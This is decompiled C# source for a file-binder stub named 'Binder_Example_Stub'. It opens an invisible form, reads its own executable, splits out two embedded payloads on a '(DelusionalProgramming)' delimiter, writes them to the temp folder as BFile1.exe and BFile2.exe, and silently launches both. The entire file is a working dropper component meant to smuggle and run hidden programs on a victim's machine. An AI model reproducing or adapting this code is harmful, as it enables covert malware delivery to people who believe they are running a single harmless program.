using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Binder_Example_Stub;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer icontainer_0;

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_AutoSizeMode((AutoSizeMode)0);
		Size clientSize = new Size(10, 10);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_ControlBox(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string tempPath = default(string);
		string text = default(string);
		string[] array = default(string[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 398:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0012;
						case 4:
							goto IL_0025;
						case 5:
							goto IL_0035;
						case 6:
							goto IL_004a;
						case 7:
							goto IL_005e;
						case 8:
							goto IL_006f;
						case 9:
							goto IL_0088;
						case 10:
							goto IL_009f;
						case 11:
							goto IL_00b4;
						case 12:
							goto IL_00ce;
						case 13:
							goto IL_00e5;
						case 14:
							goto IL_00fa;
						case 15:
							goto IL_010f;
						case 16:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 17:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_010f:
					num = 15;
					Process.Start(tempPath + "\\BFile2.exe");
					break;
					IL_00fa:
					num = 14;
					Process.Start(tempPath + "\\BFile1.exe");
					goto IL_010f;
					IL_0009:
					num = 2;
					tempPath = Path.GetTempPath();
					goto IL_0012;
					IL_0012:
					num = 3;
					FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
					goto IL_0025;
					IL_0025:
					num = 4;
					text = Strings.Space(checked((int)FileSystem.LOF(1)));
					goto IL_0035;
					IL_0035:
					num = 5;
					FileSystem.FileGet(1, ref text, -1L, false);
					goto IL_004a;
					IL_004a:
					num = 6;
					FileSystem.FileClose(new int[1] { 1 });
					goto IL_005e;
					IL_005e:
					num = 7;
					array = Strings.Split(text, "(DelusionalProgramming)", -1, (CompareMethod)0);
					goto IL_006f;
					IL_006f:
					num = 8;
					FileSystem.FileOpen(3, tempPath + "\\BFile1.exe", (OpenMode)32, (OpenAccess)3, (OpenShare)(-1), -1);
					goto IL_0088;
					IL_0088:
					num = 9;
					FileSystem.FilePut(3, array[1], -1L, false);
					goto IL_009f;
					IL_009f:
					num = 10;
					FileSystem.FileClose(new int[1] { 3 });
					goto IL_00b4;
					IL_00b4:
					num = 11;
					FileSystem.FileOpen(5, tempPath + "\\BFile2.exe", (OpenMode)32, (OpenAccess)3, (OpenShare)(-1), -1);
					goto IL_00ce;
					IL_00ce:
					num = 12;
					FileSystem.FilePut(5, array[2], -1L, false);
					goto IL_00e5;
					IL_00e5:
					num = 13;
					FileSystem.FileClose(new int[1] { 5 });
					goto IL_00fa;
					end_IL_0000_2:
					break;
				}
				num = 16;
				((Form)this).Close();
				ProjectData.EndApp();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 398;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
